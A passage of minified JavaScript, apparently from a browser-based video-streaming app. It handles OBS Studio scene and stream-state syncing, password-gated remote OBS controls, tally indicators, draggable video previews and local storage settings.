Object.keys(layout).forEach((i=>{if(layout[i])if(""===i)layout[i].forEach((j=>{if(j){var streamID=null;if("slot"in j)try{streamID=session.currentSlots[parseInt(j.slot)+1]}catch(e){errorlog(e),streamID=null}streamID?combined[streamID]=j:combined[""]?combined[""].push(j):combined[""]=j}}));else{var streamID=null;if("slot"in layout[i])try{streamID=session.currentSlots[parseInt(layout[i].slot)+1]}catch(e){errorlog(e),streamID=null}streamID?combined[streamID]=layout[i]:combined[""]?combined[""].push(layout[i]):combined[""]=[layout[i]]}})),combined}session.obsSceneSync=function(){if(session.layouts&&session.obsSceneTriggers&&session.obsState&&session.obsState.details&&session.obsState.details.currentScene.name&&session.obsSceneTriggers.includes(session.obsState.details.currentScene.name)){var idx=session.obsSceneTriggers.indexOf(session.obsState.details.currentScene.name);if(idx>=0&&session.layouts[idx]){var layout=combinedLayout(session.layouts[idx]);layout&&(session.layout=layout,updateMixer())}return!0}return!1},session.sceneSync=function(UUID){if(session.rpcs[UUID]&&session.rpcs[UUID].videoElement){var msg={};if(msg.sceneDisplay="none"!=session.rpcs[UUID].videoElement.style.display,msg.sceneMute=session.rpcs[UUID].mutedState,!1!==session.optimize){var bandwidth=parseInt(session.rpcs[UUID].targetBandwidth);!1===msg.sceneDisplay&&(bandwidth>session.optimize||bandwidth<0)&&(bandwidth=session.optimize),session.rpcs[UUID].bandwidth!==bandwidth?(msg.bitrate=bandwidth,session.sendRequest(msg,UUID)?session.rpcs[UUID].bandwidth=bandwidth:errorlog("Unable to set update OBS Visibility")):session.sendRequest(msg,UUID)}else session.sendRequest(msg,UUID)}};var TriggerOnNewDetails=!1;function getOBSDetails(callbackname="details"){if(session.disableOBS)return!1;if(window.obsstudio){"details"in session.obsState||(session.obsState.details={});var readOnlyFuncs=["getControlLevel","getCurrentScene","getScenes"],promises={main:!0};Object.keys(window.obsstudio).forEach((async key=>{try{if("function"==typeof window.obsstudio[key]&&readOnlyFuncs.includes(key))try{promises[key]=!0,window.obsstudio[key]((function(out){var shortkey=key.replace("get","");shortkey=shortkey[0].toLowerCase()+shortkey.slice(1),session.obsState.details[shortkey]=out,delete promises[key],Object.keys(promises).length||session.obsStateSync(callbackname)}))}catch(e){delete promises[key]}}catch(e){errorlog(e)}})),delete promises.main,Object.keys(promises).length||session.obsStateSync(callbackname)}}function toggleOBSControls(){if(toggle(getById("remoteOBSControl")),"none"==getById("remoteOBSControl").style.display)getById("modalBackdrop").innerHTML="",getById("modalBackdrop").remove();else{getById("modalBackdrop").innerHTML="",getById("modalBackdrop").remove();document.body.insertAdjacentHTML("beforeend",'<div id="modalBackdrop" style="z-index:24"></div>'),document.getElementById("modalBackdrop").addEventListener("click",toggleOBSControls)}}function requestOBSAction(ele){if(session.disableOBS)return!1}function obsSceneChanged(event){log(event.detail.name),getOBSDetails()}function obsVirtualcamStarted(event){session.obsState.virtualcam=!0,session.obsStateSync("virtualcam")}function obsVirtualcamStopped(event){session.obsState.virtualcam=!1,session.obsStateSync("virtualcam")}function obsStreamingStarted(event){session.obsState.streaming=!0,session.obsStateSync("streaming")}function obsStreamingStopped(event){session.obsState.streaming=!1,session.obsStateSync("streaming")}function obsRecordingStarted(event){session.obsState.recording=!0,session.obsStateSync("recording")}function obsRecordingStopped(event){session.obsState.recording=!1,session.obsStateSync("recording")}function obsSourceActiveChanged(event){warnlog("obsSourceActiveChanged"),warnlog(event.detail);try{if("boolean"==typeof event)var sourceActive=event;else if("boolean"==typeof event.detail)sourceActive=event.detail;else if("boolean"==typeof event.detail.active)sourceActive=event.detail.active;else sourceActive=event.detail.active;if(void 0===sourceActive)return;session.obsState.sourceActive!==sourceActive&&(session.obsState.sourceActive=sourceActive,session.obsStateSync("sourceActive"))}catch(e){errorlog(e)}}function obsSourceVisibleChanged(event){warnlog("obsSourceVisibleChanged"),warnlog(event.detail);try{if("boolean"==typeof event)var visibility=event;else if("boolean"==typeof event.detail)visibility=event.detail;else if("boolean"==typeof event.detail.visible)visibility=event.detail.visible;else visibility=event.detail.visible;if(void 0===visibility)if(void 0!==document.visibilityState)visibility="visible"===document.visibilityState;else{if(void 0===document.hidden)return;visibility=!document.hidden}session.obsState.visibility!==visibility&&(session.obsState.visibility=visibility,session.obsStateSync("visibility"))}catch(e){errorlog(e)}}function manageSceneState(data,UUID){if(!session.disableOBS){var processNeeded=!1;try{"sceneDisplay"in data&&(processNeeded=!0,session.pcs[UUID].sceneDisplay=data.sceneDisplay),"sceneMute"in data&&(processNeeded=!0,session.pcs[UUID].sceneMute=data.sceneMute),data.obsState&&("sourceActive"in data.obsState&&(processNeeded=!0,session.pcs[UUID].obsState.sourceActive=data.obsState.sourceActive),"visibility"in data.obsState&&(processNeeded=!0,session.pcs[UUID].obsState.visibility=data.obsState.visibility,session.optimizeBitrate(UUID)),"details"in data.obsState&&(processNeeded=!0,session.pcs[UUID].obsState.details=data.obsState.details),"streaming"in data.obsState&&(processNeeded=!0,session.pcs[UUID].obsState.streaming=data.obsState.streaming),"recording"in data.obsState&&(processNeeded=!0,session.pcs[UUID].obsState.recording=data.obsState.recording),"virtualcam"in data.obsState&&(processNeeded=!0,session.pcs[UUID].obsState.virtualcam=data.obsState.virtualcam))}catch(e){errorlog(e)}if(processNeeded&&(log(data),applySceneState(),isIFrame&&pokeIframeAPI("obs-state",data.obsState,UUID),!1!==session.obsControls)){try{var control=0;session.pcs[UUID].obsState&&session.pcs[UUID].obsState.details&&(control=parseInt(session.pcs[UUID].obsState.details.controlLevel)||0),control>=4&&(!session.director&&session.roomid||session.pcs[UUID].remote&&!1!==session.obsControls&&getById("obscontrolbutton").classList.remove("hidden"));var obsControlButtonsBox,controlButton,multi=!1;if(getById("obsControlButtons").querySelectorAll("[data-system]").forEach((ele=>{ele.dataset.system in session.pcs?ele.dataset.system!==UUID&&(multi=!0):ele.remove()})),getById("obsSceneNames").querySelectorAll("[data-system]").forEach((ele=>{ele.dataset.system in session.pcs?ele.dataset.system!==UUID&&(multi=!0):ele.remove()})),0==control)return(obsControlButtonsBox=getById("obsControlButtons").querySelector("[data-system='"+UUID+"']"))&&obsControlButtonsBox.remove(),(obsSceneNamesBox=getById("obsSceneNames").querySelector("[data-system='"+UUID+"']"))&&obsSceneNamesBox.remove(),void(multi||getById("obsControlHelp").classList.remove("hidden"));if(getById("obsControlHelp").classList.add("hidden"),(obsControlButtonsBox=getById("obsControlButtons").querySelector("[data-system='"+UUID+"']"))?obsControlButtonsBox.innerHTML="":((obsControlButtonsBox=document.createElement("div")).dataset.system=UUID,getById("obsControlButtons").appendChild(obsControlButtonsBox)),multi)(h3=document.createElement("h3")).innerText="OBS instance: "+(session.pcs[UUID].label||session.pcs[UUID].scene||UUID),obsControlButtonsBox.appendChild(h3);if(session.pcs[UUID].obsState&&"streaming"in session.pcs[UUID].obsState)(controlButton=document.createElement("button")).dataset.UUID=UUID,session.pcs[UUID].obsState.streaming?(controlButton.classList.add("pressed"),controlButton.ariaPressed="true",controlButton.dataset.obsAction="stopStreaming",controlButton.innerText="ğŸ“¡ stop streaming"):(controlButton.dataset.obsAction="startStreaming",controlButton.innerText="ğŸ“¡ start streaming"),control<5?(controlButton.disabled=!0,controlButton.style.cursor="not-allowed",controlButton.title="Source is lacking required permissions."):controlButton.onclick=async function(){var msg={obsCommand:{}};msg.obsCommand.action=this.dataset.obsAction,msg.UUID=this.dataset.UUID,document.querySelector("#obsRemotePassword>input")&&document.querySelector("#obsRemotePassword>input").value?msg.remote=document.querySelector("#obsRemotePassword>input").value:msg.remote=session.remote,msg=await session.encodeRemote(msg),session.anysend(msg),log("action request: "+this.dataset.obsAction)},obsControlButtonsBox.appendChild(controlButton);if(session.pcs[UUID].obsState&&"recording"in session.pcs[UUID].obsState)(controlButton=document.createElement("button")).dataset.UUID=UUID,session.pcs[UUID].obsState.recording?(controlButton.classList.add("pressed"),controlButton.ariaPressed="true",controlButton.dataset.obsAction="stopRecording",controlButton.innerText="ğŸ“½ stop recording"):(controlButton.dataset.obsAction="startRecording",controlButton.innerText="ğŸ“½ start recording"),control<5?(controlButton.disabled=!0,controlButton.style.cursor="not-allowed",controlButton.title="Source is lacking required permissions."):controlButton.onclick=async function(){var msg={obsCommand:{}};msg.obsCommand.action=this.dataset.obsAction,msg.UUID=this.dataset.UUID,document.querySelector("#obsRemotePassword>input").value?msg.remote=document.querySelector("#obsRemotePassword>input").value:msg.remote=session.remote,msg=await session.encodeRemote(msg),session.anysend(msg),log("action request: "+this.dataset.obsAction)},obsControlButtonsBox.appendChild(controlButton);if(session.pcs[UUID].obsState&&"virtualcam"in session.pcs[UUID].obsState)(controlButton=document.createElement("button")).dataset.UUID=UUID,session.pcs[UUID].obsState.virtualcam?(controlButton.classList.add("pressed"),controlButton.ariaPressed="true",controlButton.dataset.obsAction="stopVirtualcam",controlButton.innerText="ğŸ’» stop virtualcam"):(controlButton.dataset.obsAction="startVirtualcam",controlButton.innerText="ğŸ’» start virtualcam"),control<5?(controlButton.disabled=!0,controlButton.style.cursor="not-allowed",controlButton.title="Source is lacking required permissions."):controlButton.onclick=async function(){var msg={obsCommand:{}};msg.obsCommand.action=this.dataset.obsAction,msg.UUID=this.dataset.UUID,document.querySelector("#obsRemotePassword>input").value?msg.remote=document.querySelector("#obsRemotePassword>input").value:msg.remote=session.remote,msg=await session.encodeRemote(msg),session.anysend(msg),log("action request: "+this.dataset.obsAction)},obsControlButtonsBox.appendChild(controlButton)}catch(e){errorlog(e)}if(control<2){(obsSceneNamesBox=getById("obsSceneNames").querySelector("[data-system='"+UUID+"']"))&&obsSceneNamesBox.remove()}else{var obsSceneNamesBox,h3;if((obsSceneNamesBox=getById("obsSceneNames").querySelectorAll("div[data-system='"+UUID+"']")).length?(obsSceneNamesBox=obsSceneNamesBox[0]).innerHTML="":((obsSceneNamesBox=document.createElement("div")).dataset.system=UUID,getById("obsSceneNames").appendChild(obsSceneNamesBox)),multi)(h3=document.createElement("h3")).innerText="OBS instance: "+(session.pcs[UUID].label||session.pcs[UUID].scene||UUID),obsSceneNamesBox.appendChild(h3);if(session.pcs[UUID].obsState.details){var details=session.pcs[UUID].obsState.details;details.scenes&&details.scenes.forEach((scene=>{var sceneButton=document.createElement("button");sceneButton.dataset.obsScene=scene,sceneButton.dataset.UUID=UUID,sceneButton.innerText=scene,details.currentScene&&details.currentScene.name&&details.currentScene.name===scene&&(sceneButton.classList.add("pressed"),sceneButton.ariaPressed="true"),obsSceneNamesBox.appendChild(sceneButton),control<4?(sceneButton.disabled=!0,sceneButton.style.cursor="not-allowed",sceneButton.title="Source is lacking required permissions."):sceneButton.onclick=async function(){var msg={};msg.obsCommand={action:"setCurrentScene",value:this.dataset.obsScene},msg.UUID=this.dataset.UUID,document.querySelector("#obsRemotePassword>input").value?msg.remote=document.querySelector("#obsRemotePassword>input").value:msg.remote=session.remote,msg=await session.encodeRemote(msg),session.anysend(msg),log("scene change request: "+this.dataset.obsScene)}}))}getById("debugRemoteOBSControl").innerText=JSON.stringify(session.pcs[UUID].obsState)}}}}function processOBSCommand(msg){if(session.disableOBS)return!1;if(!window.obsstudio)return!1;if("object"!=typeof msg.obsCommand)return!1;if(!("remote"in msg)){if(msg.UUID&&msg.obsCommand.action){data={rejected:"obsCommand"};session.sendRequest(data,msg.UUID)}return!1}if(!(msg.remote===session.remote&&session.remote||!0===session.remote)){if(msg.UUID&&msg.obsCommand.action){var data={rejected:"obsCommand"};session.sendRequest(data,msg.UUID)}return warnlog("Denied access; remote does not match"),!1}try{if(msg.obsCommand.action&&"string"==typeof msg.obsCommand.action)if(msg.obsCommand.value&&"string"==typeof msg.obsCommand.value){if("setCurrentScene"==msg.obsCommand.action&&session.filterOBSscenes&&session.filterOBSscenes.length)try{if(!session.filterOBSscenes.includes(msg.obsCommand.value))return!1}catch(e){return errorlog(e),!1}window.obsstudio[msg.obsCommand.action](msg.obsCommand.value)}else window.obsstudio[msg.obsCommand.action]()}catch(e){return errorlog(e),!1}return!0}function applySceneState(){if(document.getElementById("videosource")){var visibility=!1,ondeck=!1,recording=!1;if(!1!==session.tallyOverride)1==session.tallyOverride?recording=!0:2==session.tallyOverride?(ondeck=!0,visibility=!1,recording=!1):3==session.tallyOverride?(visibility=!0,recording=!1):0==session.tallyOverride&&(ondeck=!1,visibility=!1,recording=!1),session.cleanOutput||getById("obsState").classList.remove("hidden");else{if(session.disableOBS)return;for(var uid in session.pcs)!1!==session.pcs[uid].obsState.sourceActive&&session.pcs[uid].obsState.visibility&&!1!==session.pcs[uid].sceneDisplay?visibility=!0:session.pcs[uid].obsState.visibility&&!1!==session.pcs[uid].sceneDisplay&&(ondeck=!0),(session.pcs[uid].obsState.recording||session.pcs[uid].obsState.streaming)&&!1!==session.pcs[uid].obsState.sourceActive&&session.pcs[uid].obsState.visibility&&!1!==session.pcs[uid].sceneDisplay&&(recording=!0);session.cleanOutput||getById("obsState").classList.remove("hidden")}if(recording?(getById("obsState").classList.remove("ondeck"),getById("obsState").classList.add("recording"),getById("obsState").innerHTML="ON AIR",session.tallyStyle&&(getById("main").classList.remove("ondeck"),getById("main").classList.add("recording"))):visibility?(getById("obsState").classList.remove("recording"),getById("obsState").classList.remove("ondeck"),getById("obsState").innerHTML="ACTIVE",session.tallyStyle?(getById("main").classList.remove("recording"),getById("main").classList.remove("ondeck")):getById("obsState").classList.add("hidden")):ondeck?(getById("obsState").classList.remove("recording"),getById("obsState").classList.add("ondeck"),getById("obsState").innerHTML="STAND BY",session.tallyStyle&&(getById("main").classList.remove("recording"),getById("main").classList.add("ondeck"))):(getById("obsState").classList.remove("recording"),getById("obsState").classList.remove("ondeck"),getById("obsState").innerHTML="INACTIVE",getById("obsState").classList.add("hidden"),session.tallyStyle&&(getById("main").classList.remove("recording"),getById("main").classList.remove("ondeck"))),visibility?(getById("obsState").classList.add("onair"),session.tallyStyle&&getById("main").classList.add("onair")):(getById("obsState").classList.remove("onair"),session.tallyStyle&&getById("main").classList.remove("onair")),session.automute){if(visibility)session.micIsolatedAutoMute=!1;else if(session.micIsolatedAutoMute=[],"2"!==session.automute)for(var uid in session.pcs)session.directorList.indexOf(uid)>=0&&session.micIsolatedAutoMute.push(uid);session.applyIsolatedChat()}}}function compare_vids(a,b){var aa=a.order||0,bb=b.order||0;return aa<bb?1:aa>bb?-1:0}function compare_vids_sid(a,b){var aa=a.dataset.sid||0,bb=b.dataset.sid||0;return aa>bb?1:aa<bb?-1:0}function compare_vids_label(a,b){if(a.dataset.UUID&&session.rpcs[a.dataset.UUID]&&session.rpcs[a.dataset.UUID].label)var aa=session.rpcs[a.dataset.UUID].label.toLowerCase();else aa=0;if(b.dataset.UUID&&session.rpcs[b.dataset.UUID]&&session.rpcs[b.dataset.UUID].label)var bb=session.rpcs[b.dataset.UUID].label.toLowerCase();else bb=0;return aa>bb?1:aa<bb?-1:0}function sortByZ(mediaPool,layout){return mediaPool.sort((function sortABZ(a,b){if(layout[a.dataset.sid])var aa=layout[a.dataset.sid].zIndex||layout[a.dataset.sid].z||0;else aa=0;if(layout[b.dataset.sid])var bb=layout[b.dataset.sid].zIndex||layout[b.dataset.sid].z||0;else bb=0;return aa<bb?-1:aa>bb?1:0})),mediaPool}session.obsStateSync=function(data2send=!1,uid=!1){if(!session.disableOBS&&window.obsstudio){log(data2send),data2send&&"sourceActive"==data2send&&session.obsState.sourceActive?TriggerOnNewDetails=!0:data2send&&"details"==data2send&&session.obsState.sourceActive&&TriggerOnNewDetails&&session.obsState.details&&session.obsState.details.currentScene&&session.obsState.details.currentScene.name&&(session.obsState.details.thisScene=session.obsState.details.currentScene.name,TriggerOnNewDetails=!1);var needOptimize=!1;for(var UUID in null!==session.obsState.visibility&&!1===session.obsState.visibility&&(needOptimize=!0),session.obsSceneSync(),session.rpcs)if(!uid||uid===UUID){var msg={};if(data2send){if(data2send in session.obsState)if("details"==data2send){if(!1===session.rpcs[UUID].obsControl)continue;msg.obsState={},msg.obsState[data2send]=session.obsState[data2send]}else msg.obsState={},msg.obsState[data2send]=session.obsState[data2send]}else msg.obsState=session.obsState,!1===session.rpcs[UUID].obsControl&&(msg.obsState.details=null);if(session.filterOBSscenes&&msg.obsState&&msg.obsState.details&&msg.obsState.details.scenes&&msg.obsState.details.scenes.length){var scenes=[];msg.obsState.details.scenes.forEach((scene=>{session.filterOBSscenes&&session.filterOBSscenes.length&&session.filterOBSscenes.includes(scene)&&scenes.push(scene)})),msg.obsState.details.scenes=scenes}if(!1!==session.optimize){var bandwidth=parseInt(session.rpcs[UUID].targetBandwidth);needOptimize&&(bandwidth>session.optimize||bandwidth<0)&&(bandwidth=session.optimize),session.rpcs[UUID].bandwidth!==bandwidth?(msg.bitrate=bandwidth,warnlog("Message to be sent: "),warnlog(msg),session.sendRequest(msg,UUID)?session.rpcs[UUID].bandwidth=bandwidth:errorlog("Unable to set update OBS Visibility")):(warnlog("Message to be sent: "),warnlog(msg),session.sendRequest(msg,UUID))}else warnlog("Message to be sent: "),warnlog(msg),session.sendRequest(msg,UUID)}}},session.getOBSOptimization=function(msg,UUID){if(session.obsState){msg.obsState={};var needOptimize=!1;null!==session.obsState.visibility&&(msg.obsState.visibility=session.obsState.visibility,!1===session.obsState.visibility&&(needOptimize=!0)),null!==session.obsState.sourceActive&&(msg.obsState.sourceActive=session.obsState.sourceActive),null!==session.obsState.recording&&(msg.obsState.recording=session.obsState.recording),null!==session.obsState.streaming&&(msg.obsState.streaming=session.obsState.streaming),null!==session.obsState.virtualcam&&(msg.obsState.virtualcam=session.obsState.virtualcam)}return!1!==session.optimize&&(msg.optimizedBitrate=parseInt(session.optimize),needOptimize&&(session.rpcs[UUID].bandwidth=msg.optimizedBitrate)),msg},window.onpopstate=function(){session.firstPlayTriggered&&window.location.reload(!0)};var miniPerformerX=null,miniPerformerY=null;function makeMiniDraggableElement(elmnt){if(!session.disableMouseEvents){try{elmnt.dragElement=!1,elmnt.style.cursor="grab",elmnt.stashonmouseup=null,elmnt.stashonmousemove=null}catch(e){return void errorlog(e)}var pos1=0,pos2=0,pos3=0,pos4=0,timestamp=!1;elmnt.onmousedown=dragMouseDown,elmnt.ontouchstart=dragMouseDown}function elementDrag(e){if(timestamp=!1,!session.infocus)try{if("touchmove"!==(e=e||window.event).type){if("buttons"in e&&1!==e.buttons)return void closeDragElement(e);e.preventDefault()}e.stopPropagation(),elmnt.dragElement=!0,"touchmove"===e.type?(pos1=pos3-e.touches[0].clientX,pos2=pos4-e.touches[0].clientY,pos3=e.touches[0].clientX,pos4=e.touches[0].clientY):(pos1=pos3-e.clientX,pos2=pos4-e.clientY,pos3=e.clientX,pos4=e.clientY);var topDrag=elmnt.offsetTop-pos2;topDrag>window.innerHeight-elmnt.clientHeight-3&&(topDrag=window.innerHeight-elmnt.clientHeight-3),miniPerformerY=topDrag,miniPerformerX=elmnt.offsetLeft-pos1,miniPerformerY>window.innerHeight-elmnt.clientHeight&&(miniPerformerY=window.innerHeight-elmnt.clientHeight),miniPerformerX>window.innerWidth-elmnt.clientWidth&&(miniPerformerX=window.innerWidth-elmnt.clientWidth),miniPerformerX=100*miniPerformerX/window.innerWidth,miniPerformerY=100*miniPerformerY/window.innerHeight,session.widget&&!session.leftMiniPreview&&miniPerformerX>74&&(miniPerformerX=74),miniPerformerY<0?miniPerformerY=0:miniPerformerY>100&&(miniPerformerY=100),miniPerformerX<0?miniPerformerX=0:miniPerformerX>100&&(miniPerformerX=100),elmnt.style.right="unset",elmnt.style.top=miniPerformerY+"%",elmnt.style.left=miniPerformerX+"%"}catch(e){errorlog(e)}}function closeDragElement(e){if("touchend"!==(e=e||window.event).type){if(0!==e.button)return;document.onmouseup=elmnt.stashonmouseup,document.onmousemove=elmnt.stashonmousemove,elmnt.onmouseleave=null}session.infocus||(e.preventDefault(),timestamp&&Date.now()-timestamp>500?(e.stopPropagation(),"touchend"===e.type&&(!0===session.infocus?session.infocus=!1:(session.infocus=!0,log("session: myself")),setTimeout((()=>updateMixer()),10))):timestamp&&"touchend"!==e.type&&(!0===session.infocus?session.infocus=!1:(session.infocus=!0,log("session: myself")),setTimeout((()=>updateMixer()),10)))}function dragMouseDown(e){if(!event.ctrlKey&&!event.metaKey&&(timestamp=Date.now(),e=e||window.event,!session.infocus))if(e.preventDefault(),"touchstart"===e.type)pos3=e.touches[0].clientX,pos4=e.touches[0].clientY,elmnt.ontouchend=closeDragElement,elmnt.ontouchmove=elementDrag;else{if(0!==e.button)return;pos3=e.clientX,pos4=e.clientY,elmnt.stashonmouseup=document.onmouseup,elmnt.stashonmousemove=document.onmousemove,document.onmouseup=closeDragElement,document.onmousemove=elementDrag,elmnt.onmouseleave=function(event){closeDragElement(event)}}}}function makeDraggableElement(element){function dragEnd(e){element.initialX=element.currentX,element.initialY=element.currentY,document.removeEventListener("mousemove",drag),document.removeEventListener("mouseup",dragEnd),document.removeEventListener("onmouseleave",dragEnd),document.removeEventListener("onmouseenter",dragEnd),element.isDragging=!1}function drag(e){if(element.isDragging){element.currentX=e.clientX-element.initialX,element.currentY=e.clientY-element.initialY;let vw=Math.max(document.documentElement.clientWidth||0,window.innerWidth||0),vh=Math.max(document.documentElement.clientHeight||0,window.innerHeight||0),maxX=vw-element.offsetWidth,maxY=vh-element.offsetHeight,minX=0,minY=0,topOffset=0,leftOffset=0,elementOffset=element;for(;elementOffset;)topOffset+=elementOffset.offsetTop,leftOffset+=elementOffset.offsetLeft,elementOffset=elementOffset.offsetParent;let realX=element.currentX+leftOffset,realY=element.currentY+topOffset;realX>maxX?element.currentX=maxX-leftOffset:realX<minX&&(element.currentX=minX-leftOffset),realY>maxY?element.currentY=maxY-topOffset:realY<minY&&(element.currentY=minY-topOffset),element.xOffset=element.currentX,element.yOffset=element.currentY,element.style.transform=`translate(${element.currentX}px, ${element.currentY}px)`}}session.disableMouseEvents||(element.initialX,element.initialY,element.currentX,element.xOffset=0,element.currentY,element.yOffset=0,element.isDragging=!1,element.dragElement=!0,element.addEventListener("mousedown",(function dragStart(e){element.initialX=e.clientX-element.xOffset,element.initialY=e.clientY-element.yOffset,document.addEventListener("mousemove",drag),document.addEventListener("mouseup",dragEnd),document.addEventListener("onmouseleave",dragEnd),document.addEventListener("onmouseenter",dragEnd),element.isDragging=!0})))}function removeStorage(cname){localStorage.removeItem(cname)}function clearStorage(){localStorage.clear(),session.cleanOutput||warnUser("The local storage and saved settings have been cleared",1e3)}function setStorage(cname,cvalue,hours=9999){var item={value:cvalue,expiry:(new Date).getTime()+60*hours*60*1e3};try{localStorage.setItem(cname,JSON.stringify(item))}catch(e){errorlog(e)}}function getStorage(cname){try{var itemStr=localStorage.getItem(cname)}catch(e){return void errorlog(e)}if(!itemStr)return"";var item=JSON.parse(itemStr);return(new Date).getTime()>item.expiry?(localStorage.removeItem(cname),""):item.value}function play(streamid=null,UUID=!1){if(log("play stream: "+session.view+" "+streamid),session.viewDirectorOnly){if(!UUID&&!streamid)return void warnlog("No UUID and StreamID");if(-1==session.directorList.indexOf(UUID))return void warnlog("Not a director")}if(session.view_set){var played=!1;for(var j in session.view_set)(null===streamid||streamid===session.view_set[j])&&(session.watchStream(session.view_set[j]),played=!0);session.include&&session.include.forEach((sid=>{session.view_set.includes(sid)||(null===streamid?session.watchStream(sid):streamid===sid&&(session.watchStream(sid),played=!0))})),!played&&streamid&&!1!==session.scene&&(session.permaid||session.queue||!1!==session.exclude&&session.exclude.includes(streamid)||UUID&&session.directorList.indexOf(UUID)>=0&&(warnlog("stream ID added to badStreamList: "+streamid),session.badStreamList.push(streamid),session.watchStream(streamid)))}else streamid&&!1!==session.exclude?session.exclude.includes(streamid)||session.watchStream(streamid):streamid?session.watchStream(streamid):session.include.length&&session.include.forEach((sid=>{session.watchStream(sid)}))}function nextQueue(){if(session.queue&&session.director){if(0==session.queueList.length)return getById("queuebutton").classList.add("red"),void setTimeout((function(){getById("queuebutton").classList.remove("red")}),50);var nextStream=session.queueList.shift();getById("queuebutton").classList.add("red"),setTimeout((function(){getById("queuebutton").classList.remove("red")}),200),updateQueue(),session.watchStream(nextStream),log("next stream loading: "+nextStream)}}function updateQueue(adding=!1){session.queue&&session.director&&(session.queueList.length?(session.queueList.length>10?getById("queueNotification").innerHTML="â€¼":getById("queueNotification").innerHTML=session.queueList.length,getById("queueNotification").classList.add("queueNotification")):(getById("queueNotification").innerHTML="",getById("queueNotification").classList.remove("queueNotification")),adding&&(session.beepToNotify&&(playtone(),showNotification("someone joined the queue","queue length: "+session.queueList.length)),getById("queuebutton").classList.remove("shake"),setTimeout((function(){getById("queuebutton").classList.add("shake")}),10)))}function hideStreamLowBandwidth(bandwidth,UUID){session.lowBitrateCutoff&&(!session.directorList.includes(UUID)&&!session.rpcs[UUID].director||session.showDirector||session.rpcs[UUID].showDirector)&&(bandwidth<=session.lowBitrateCutoff?session.lowBitrateSceneChange?changeSceneLowBandwidth(!0):session.rpcs[UUID].bandwidthMuted||(session.rpcs[UUID].bandwidthMuted=!0,updateMixer()):session.lowBitrateSceneChange?changeSceneLowBandwidth(!1):session.rpcs[UUID].bandwidthMuted&&(session.rpcs[UUID].bandwidthMuted=!1,session.rpcs[UUID].videoElement&&(session.rpcs[UUID].videoElement.muted=checkMuteState(UUID)),updateMixer()))}var changeSceneEnabled=!1,changeSceneLowBandwidthRevert=!1;function changeSceneLowBandwidth(state){if(session.lowBitrateSceneChange&&session.obsState)try{if(session.obsState.sourceActive&&session.obsState.details&&session.obsState.details.currentScene)changeSceneLowBandwidthRevert=session.obsState.details.currentScene.name||!1;else if("sourceActive"in session.obsState&&!session.obsState.sourceActive&&session.obsState.details&&session.obsState.details.currentScene&&session.obsState.details.currentScene.name!==session.lowBitrateSceneChange)return;if(!window.obsstudio||!window.obsstudio.setCurrentScene)return;state&&changeSceneLowBandwidthRevert?changeSceneEnabled&&window.obsstudio.setCurrentScene(session.lowBitrateSceneChange):changeSceneLowBandwidthRevert&&(changeSceneEnabled=!0,window.obsstudio.setCurrentScene(changeSceneLowBandwidthRevert))}catch(e){errorlog(e)}}function setupIncomingScreenTracking(v,UUID){(session.directorList.indexOf(UUID)>=0&&(v.muted=!1),v.addEventListener("playing",(e=>{try{var bigPlayButton=document.getElementById("bigPlayButton");bigPlayButton&&bigPlayButton.parentNode.removeChild(bigPlayButton)}catch(e){}resetupAudioOut(e.target,!0);try{session.pip&&v.readyState>=3&&(v.pip||(v.pip=!0,toggleSystemPip(v,!0)))}catch(e){}}),{once:!0}),v.onpause=event=>(v.dataset.UUID&&session.rpcs[v.dataset.UUID]&&0===session.rpcs[v.dataset.UUID].manualBandwidth||event.ctrlKey||event.metaKey||(warnlog("Video paused; force it to play again"),event.currentTarget.play().then((_=>{log("playing 4")})).catch((error=>{warnlog("didnt play 1")})),Firefox&&unPauseVideo(v)),!0),session.pip&&(v.onloadedmetadata=function(){v.paused||v.pip||(v.pip=!0,toggleSystemPip(v,!0))}),v.addEventListener("resize",(e=>{var v=e.target,aspectRatio=parseFloat(v.videoWidth/v.videoHeight)||0;log("resize event: "+aspectRatio),aspectRatio?v.resetAR?(log("ASPECT RATIO UNMUTED"),delete v.resetAR,v.dataset.aspectRatio=aspectRatio,pokeIframeAPI("aspect-ratio",v.dataset.aspectRatio,v.dataset.UUID,v.dataset.sid),setTimeout((function(){updateMixer()}),1)):v.dataset.aspectRatio?aspectRatio!=parseFloat(v.dataset.aspectRatio)&&(log("ASPECT RATIO CHANGED"),v.dataset.aspectRatio=aspectRatio,pokeIframeAPI("aspect-ratio",v.dataset.aspectRatio,v.dataset.UUID,v.dataset.sid),setTimeout((function(){updateMixer()}),1)):(log("NEW VIDEO ? ASPECT RATIO new"),v.dataset.aspectRatio=aspectRatio,pokeIframeAPI("aspect-ratio",v.dataset.aspectRatio,v.dataset.UUID,v.dataset.sid),setTimeout((function(){updateMixer()}),1)):v.resetAR=!0})),"number"==typeof session.volume?v.volume=session.volume:v.volume=1,v.autoplay=!0,v.controls=session.showControls||!1,v.classList.add("tile"),v.setAttribute("playsinline",""),v.controlTimer=null,v.dataset.menu="context-menu-video",session.cleanOutput||v.classList.add("task"),document.getElementById("mainmenu"))&&(getById("mainmenu").remove(),document.querySelectorAll(".hidden2").forEach((ele2=>{ele2.classList.remove("hidden2")})));if(session.director){null!==session.showControls?v.controls=session.showControls:v.controls=!0;var container=getById("screenContainer_"+UUID);v.container=container,v.disablePictureInPicture=!1,v.setAttribute("controls","controls"),container.appendChild(v),pokeIframeAPI("control-box-video-updated",v.id,UUID),session.requestRateLimit(session.directorViewBitrate,UUID),v.title="Hold CTRL or CMD (âŒ˜) while clicking the video to open detailed stats",session.beepToNotify&&playtone()}else!1!==session.scene?(v.controls=session.showControls||!1,session.view||"0"===session.scene?v.style.display="block":(v.style.display="none",v.mutedStateScene=!0),setTimeout((function(){updateMixer()}),1)):!1!==session.roomid?(session.cleanOutput||session.studioSoftware?v.controls=session.showControls||!1:null!==session.showControls?v.controls=session.showControls:v.controls=!0,setTimeout((function(){updateMixer()}),1)):(v.style.display="block",setTimeout((function(){updateMixer()}),1));if(v.addEventListener("click",(function(e){log("clicked");try{var uid=e.currentTarget.dataset.UUID;if(e.ctrlKey||e.metaKey){if(e.preventDefault(),!1!==session.statsMenu&&"stats"in session.rpcs[uid]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,uid),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,uid)}return e.stopPropagation(),!1}"prePausedBandwidth"in session.rpcs[uid]&&unPauseVideo(e.currentTarget)}catch(e){errorlog(e)}})),session.statsMenu&&"stats"in 